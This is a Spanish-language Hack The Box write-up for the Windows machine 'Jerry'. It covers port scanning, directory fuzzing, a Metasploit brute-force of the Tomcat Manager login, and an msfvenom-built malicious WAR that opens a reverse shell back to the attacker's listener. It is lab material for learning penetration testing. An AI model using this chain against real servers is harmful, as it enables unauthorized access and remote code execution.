# 🏴 Writeup — Jerry

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Windows
> **🎯 IP:** 10.129.14.68
> **💀 Dificultad:** Fácil
> **🌐 Plataforma:** Hack The Box

---
## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración, lanzamos un ping para verificar conectividad con la máquina objetivo. Además del simple echo reply, aprovecharemos el valor del **TTL** para intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```python
> ping -c 1 10.129.14.68
> ```
>
> `-c 1` — Envía **un único paquete ICMP** y termina, en lugar de pingear indefinidamente.
> `10.129.14.68` — **IP objetivo** a la que se lanza el ping.

![](assets/Jerry-img-02-03-2026.png)

Como se puede observar en el output, obtenemos respuesta con un TTL de **127**, lo que nos indica que estamos ante una máquina **Windows**. Confirmada la conectividad, procedemos con la enumeración.

### 👁️ Enumeración con NMAP

#### Enumeración de puertos

Comenzamos la fase de enumeración identificando qué puertos se encuentran abiertos en la máquina objetivo. Para ello utilizamos nmap en su modalidad de SYN Scan, que nos permite realizar un escaneo rápido y sigiloso sobre el rango completo de puertos sin completar el three-way handshake.

> [!tip] Escaneo de puertos completo y sigiloso
> ```python
> nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.14.68 -vvv -oN ports
> ```
>
> `-sS` — **SYN Scan** (half-open). Envía paquetes SYN sin completar el three-way handshake. Sigiloso y rápido, requiere root.
> `-p-` — Escanea los **65535 puertos** posibles.
> `--open` — Muestra **únicamente los puertos abiertos**, filtrando cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `10.129.14.68` — **IP objetivo** del escaneo.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `-oN ports` — Guarda el output en formato normal en un archivo llamado `ports`.

![](/assets/Jerry-img-02-03-2026-1.png)

---
#### Enumeración de versiones y servicios

Con los puertos abiertos ya identificados, el siguiente paso es determinar qué servicios y versiones están corriendo en cada uno de ellos. Esto nos permitirá identificar tecnologías concretas y posibles vectores de ataque. Para ello lanzamos nmap con sus scripts por defecto y detección de versiones, apuntando únicamente a los puertos descubiertos en el paso anterior.

> [!tip] Detección de versiones y scripts sobre puertos seleccionados
> ```python
> nmap -sC -sV -p8080 --min-rate 5000 -n -Pn -vvv 10.129.14.68 -oN version
> ```
>
> `-sC` — Lanza los **scripts por defecto** del motor NSE de nmap.
> `-sV` — **Detección de versiones** de los servicios que corren en cada puerto.
> `-p8080` — Escanea **únicamente los puertos encontrados** en el paso anterior.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `10.129.14.68` — **IP objetivo** del escaneo.
> `-oN version` — Guarda el output en formato normal en un archivo llamado `version`.

![](/assets/Jerry-img-02-03-2026-2.png)

---
#### Enumeración de posibles vulnerabilidades

Con los servicios y versiones identificados, procedemos a lanzar el conjunto de scripts de la categoría `vuln` de nmap. Estos scripts comprueban de forma automática si los servicios detectados presentan vulnerabilidades conocidas, lo que nos dará pistas concretas sobre posibles vectores de explotación.

> [!tip] Detección automática de vulnerabilidades con scripts NSE
> ```python
> nmap --script vuln -p8080 --min-rate 5000 -n -Pn -vvv -oN vuln 10.129.14.68
> ```
>
> `--script vuln` — Lanza la categoría de scripts **vuln** del motor NSE, que comprueba vulnerabilidades conocidas en los servicios detectados.
> `-p8080` — Apunta únicamente a los **puertos ya identificados** anteriormente.
> `10.129.14.68` — **IP objetivo** del escaneo.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `-oN vuln` — Guarda el output en formato normal en un archivo llamado `vuln`.

---

![](/assets/Jerry-img-02-03-2026-3.png)

El análisis del script `vuln` revela que el sistema podría ser vulnerable a **CVE-2007-6750**, una vulnerabilidad de tipo **Denial of Service (DoS)** que afecta al servidor HTTP Apache. El fallo permite a un atacante agotar los recursos del servidor manteniendo conexiones HTTP abiertas de forma indefinida mediante peticiones incompletas, lo que se conoce como ataque **Slowloris**. Si bien un DoS no nos otorga acceso directo a la máquina, confirma que el servicio web es una superficie de ataque activa que merece atención en las siguientes fases.

Con el servicio web identificado, procedemos a realizar una enumeración de directorios y archivos sobre el puerto **8080**. Utilizamos gobuster junto a una wordlist de tamaño medio, añadiendo extensiones comunes para maximizar la superficie de descubrimiento y no pasar por alto archivos de configuración, paneles de administración o recursos sensibles expuestos.

> [!tip] Fuzzing de directorios y archivos sobre puerto 8080
> ```python
> gobuster dir -u http://10.129.14.68:8080 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --ne -x php,txt,html,csv,xml -o dir_fuzz -t 40
> ```
>
> `dir` — Modo de **fuerza bruta de directorios y archivos** en un servidor web.
> `-u http://10.129.14.68:8080` — **URL objetivo**, apuntando al servicio web en el puerto 8080.
> `-w ...DirBuster-2007_directory-list-2.3-medium.txt` — **Wordlist** en su variante medium para una búsqueda exhaustiva.
> `--ne` — **No muestra errores** en el output, manteniendo la salida limpia.
> `-x php,txt,html,csv,xml` — Añade **extensiones de archivo** a cada entrada de la wordlist, ampliando la superficie de búsqueda.
> `-o dir_fuzz` — Guarda el output en un archivo llamado `dir_fuzz`.
> `-t 40` — Número de hilos a usar.

![](/assets/Jerry-img-03-03-2026-6.png)

## 💥 Explotación
---
Tras identificar el panel de administración de **Tomcat**, comprobamos que el servicio es potencialmente vulnerable a un ataque de fuerza bruta sobre el login. Para explotarlo, recurrimos a **Metasploit**, que dispone de un módulo específico para esta tarea.

Iniciamos el entorno lanzando la base de datos y la consola de Metasploit:

> [!tip] Iniciar base de datos de Metasploit
> ```python
> sudo msfdb init
> sudo service postgresql start
> ```
> Inicializa la base de datos **PostgreSQL** que usa Metasploit para almacenar resultados y sesiones y asegura que el servicio de base de datos está **activo y corriendo** antes de lanzar Metasploit.

> [!tip] Abrir la consola de Metasploit
> ```python
> sudo msfconsole
> ```
> Lanza la **consola interactiva de Metasploit** desde la que operaremos el módulo de ataque.

Una vez dentro de la consola, buscamos el módulo de fuerza bruta para el login de Tomcat Manager:

> [!tip] Buscar el módulo de login de Tomcat
> ```python
> search tomcat_mgr_login
> ```
> Localiza el módulo **auxiliary/scanner/http/tomcat_mgr_login**, diseñado para realizar fuerza bruta contra el panel de administración de Tomcat.

Con el módulo seleccionado, configuramos el objetivo y lanzamos el ataque:

> [!tip] Configurar IP objetivo y ejecutar el módulo
> ```python
> set RHOSTS 10.129.14.68
> run
> ```
> `set RHOSTS` — Define la **IP de la máquina objetivo** contra la que se lanzará el ataque de fuerza bruta.
> `run` — Ejecuta el módulo con los parámetros configurados, probando credenciales por defecto contra el panel de Tomcat.

Tras la ejecución, Metasploit comenzará a probar combinaciones posibles, hasta finalmente encontrar la correcta:

![](/assets/Jerry-img-03-03-2026.png)

Usamos las credenciales para loguearnos en el panel de manager:

![](/assets/Jerry-img-03-03-2026-1.png)

Con las credenciales obtenidas gracias al ataque de fuerza bruta, conseguimos acceso al panel de administración de **Tomcat Manager**. Navegando por la interfaz, localizamos un campo que permite la subida de archivos **.WAR**.

> [!info] ¿Qué es un archivo WAR?
> Un archivo **WAR (Web Application Archive)** es un paquete comprimido utilizado para desplegar aplicaciones web en servidores Java como Tomcat. Contiene todo lo necesario para que la aplicación funcione: clases Java, JSPs, HTML y ficheros de configuración. Desde el panel de Tomcat Manager, cualquier archivo WAR subido es **desplegado y ejecutado automáticamente** por el servidor, lo que lo convierte en un vector de ataque perfecto si tenemos acceso al panel.

Aprovechando esto, generaremos un archivo WAR malicioso con **msfvenom** que, al ser desplegado por el servidor, establecerá una **reverse shell** hacia nuestra máquina, logrando así ejecución remota de código (**RCE**) en el servidor objetivo.

![](/assets/Jerry-img-03-03-2026-2.png)

Sabiendo que podemos subir un archivo WAR al servidor, procedemos a generarlo con **msfvenom**. Antes de construir el payload definitivo, utilizamos `--list-options` para inspeccionar qué parámetros requiere el módulo y confirmar que necesitamos definir un **LHOST** y un **LPORT**, que corresponden respectivamente a la **IP de nuestra máquina atacante** y al **puerto local en escucha** que recibirá la conexión.

Dado que el servidor corre **Apache Tomcat**, un servidor de aplicaciones **Java**, el payload debe ser compatible con este entorno. Por ello seleccionamos `java/jsp_shell_reverse_tcp`, que genera código **JSP** nativo ejecutable directamente por la JVM de Tomcat, en lugar de un payload nativo de Windows o Linux que no sería interpretado correctamente por el servidor.

> [!tip] Generar el archivo WAR malicioso con msfvenom
> ```python
> msfvenom --payload java/jsp_shell_reverse_tcp --list-options
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.198 LPORT=443 -f war -o revshell.war
> ```
>
> `--payload` / `-p` — Especifica el **payload** a utilizar, en este caso una reverse shell JSP compatible con Tomcat.
> `--list-options` — Muestra los **parámetros requeridos** por el payload antes de generarlo.
> `LHOST` — **IP local** de la máquina atacante que recibirá la conexión.
> `LPORT` — **Puerto local** en escucha que recibirá la reverse shell.
> `-f war` — Define el **formato de salida** como WAR, listo para ser desplegado en Tomcat.
> `-o revshell.war` — Nombre del **archivo de salida** generado.

![](/assets/Jerry-img-03-03-2026-3.png)

Ahora subimos el archivo al servidor, y antes de ejecutarlo debemos ponernos en escucha por el puerto local que hemos especificado en el payload. Para ello usamos el archiconocido netcat:

> [!tip] Ponemos nuestra máquina en escucha con Netcat
> ```python
> netcat -lvnp 443
> ```
>
> `-l` — Modo **escucha** (listen), espera conexiones entrantes.
> `-v` — **Verbose**, muestra información detallada de la conexión.
> `-n` — Sin resolución DNS, trabaja directamente con IPs.
> `-p 443` — Define el **puerto local** en escucha, en este caso el 443.

Ahora ejecutamos el archivo que hemos subido:

![](/assets/Jerry-img-03-03-2026-4.png)

Hacemos un click sobre la ruta **/revshell** y ya tendremos acceso al servidor como root. Ahora solo queda leer las flags y habremos completado la máquina con éxito.

![](/assets/Jerry-img-03-03-2026-5.png)

---
## 📝 Lecciones Aprendidas

Esta máquina condensa varios conceptos fundamentales del pentesting web sobre entornos Java. El primer aprendizaje clave es la importancia de atacar **credenciales por defecto** antes de buscar exploits complejos — en muchos entornos reales, la puerta de entrada más sencilla es la más obvia. El segundo concepto crítico es entender el **ciclo de despliegue de aplicaciones en Tomcat**: saber que un archivo WAR es ejecutado automáticamente por el servidor al ser subido es lo que convierte un panel de administración legítimo en un vector de RCE. Por último, la selección consciente del payload `java/jsp_shell_reverse_tcp` frente a alternativas nativas de Windows refuerza la idea de que en pentesting el **contexto tecnológico del objetivo** debe guiar siempre las decisiones técnicas — atacar con la herramienta correcta marca la diferencia entre obtener acceso o no.